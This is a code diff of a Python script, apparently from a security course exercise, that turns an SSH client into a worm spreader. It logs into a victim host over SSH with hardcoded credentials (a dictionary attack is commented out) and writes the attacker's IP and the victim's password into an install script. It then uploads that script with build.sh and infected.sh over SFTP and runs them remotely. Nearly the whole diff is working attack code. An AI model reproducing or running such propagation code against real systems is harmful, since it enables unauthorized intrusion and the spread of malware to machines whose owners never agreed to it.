@@ -4,19 +4,50 @@ from dictionary import *
 from ssh import *
 import sys
 import paramiko
+import fileinput
+import os
 
+filepath = os.path.abspath("./worm.py")
 dict = dictionary()
 
 ssh  = ssh_data("csc2021", "csc2021", 22)
-ssh.passwd = dict.attack()
+# ssh.passwd = dict.attack()
 
-trans = paramiko.Transport((sys.argv[1],  22))
-trans.connect(username=ssh.username,  password=ssh.passwd)
+# ssh = paramiko.Transport((sys.argv[1],  22))
 
-client = paramiko.SSHClient()
-client._transport = trans
+with fileinput.FileInput(files="install.py", inplace=True) as file:
+    for line in file:
+        print(line.replace("ATTACKER_IP_ADDRESS", '"' + str(sys.argv[2]) + '"'), end='')
 
-stdin, stdout, stderr = client.exec_command("ls")
+with fileinput.FileInput(files="install.py", inplace=True) as file:
+    for line in file:
+        print(line.replace("VICTIM_PASSWORD", '"' + str(ssh.passwd) + '"'), end='')
+
+with fileinput.FileInput(files="install.py", inplace=True) as file:
+    for line in file:
+        print(line.replace("REMOTE_FILE_PATH", '"' + str(filepath) + '"'), end='')
+
+s = paramiko.SSHClient()
+s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+s.connect(sys.argv[1], 22, username=ssh.username,  password=ssh.passwd)
+
+# client = paramiko.SSHClient()
+# client._transport = trans
+
+# stdin, stdout, stderr = client.exec_command("ls")
+# print(stdout.read().decode())
+
+# client.close()
+
+sftp = s.open_sftp()
+sftp.put('./install.py', 'install.py')
+sftp.put('./build.sh', 'build.sh')
+sftp.put('./infected.sh', 'infected.sh')
+
+stdin, stdout, stderr = s.exec_command("chmod +x build.sh")
 print(stdout.read().decode())
 
-client.close()
+stdin, stdout, stderr = s.exec_command("./build.sh")
+print(stdout.read().decode())
+
+sftp.close()
